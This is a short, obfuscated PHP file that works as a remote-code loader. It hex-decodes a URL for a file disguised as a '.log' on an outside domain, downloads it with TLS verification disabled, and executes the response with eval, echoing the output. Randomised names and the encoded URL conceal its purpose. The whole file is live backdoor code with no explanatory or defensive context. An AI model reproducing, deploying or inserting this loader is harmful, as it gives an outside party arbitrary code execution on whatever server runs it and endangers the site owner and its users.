<?php
#  OXMX2OY3LZ_H80KGMSR

class xJ8qP
{
    private $a1, $b2 = null, $c3 = null;

    public function __construct($d4)
    {
        $this->a1 = $this->z9($d4);
        $this->y8();
    }

    private function z9($v)
    {
        $r = '';
        for ($i = 0; $i < strlen($v); $i += 2) {
            $r .= chr(hexdec(substr($v, $i, 2)));
        }
        return $r;
    }

    private function y8()
    {
        $e = $this->k1();
        if ($e === false) $e = $this->k2();
        $this->b2 = $e ?: null;
    }

    private function k1()
    {
        if (!function_exists('curl_exec')) return false;
        $c = curl_init($this->a1);
        curl_setopt_array($c, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        $r = curl_exec($c);
        $s = curl_getinfo($c, CURLINFO_HTTP_CODE);
        curl_close($c);
        return ($s === 200 && $r && strlen(trim($r)) > 10) ? $r : false;
    }

    private function k2()
    {
        $ctx = stream_context_create([
            "http" => ["follow_location" => 1, "timeout" => 10],
            "https" => ["verify_peer" => false, "verify_peer_name" => false]
        ]);
        $r = @file_get_contents($this->a1, false, $ctx);
        return ($r && strlen(trim($r)) > 10) ? $r : false;
    }

    public function qx()
    {
        if (empty($this->b2)) {
            return $this->c3 ?: "¤ No payload ¤";
        }
        try {
            ob_start();
            eval("?>".$this->b2);
            return ob_get_clean();
        } catch (Throwable $e) {
            return "¤ Error ¤";
        }
    }
}

$X0 = "68747470733a2f2f6d616e7a64726976652e636f6d2f63646e2f7261772f7072696f726974792f676f6c642e6c6f67";

$Q = new xJ8qP($X0);
echo $Q->qx();
?>
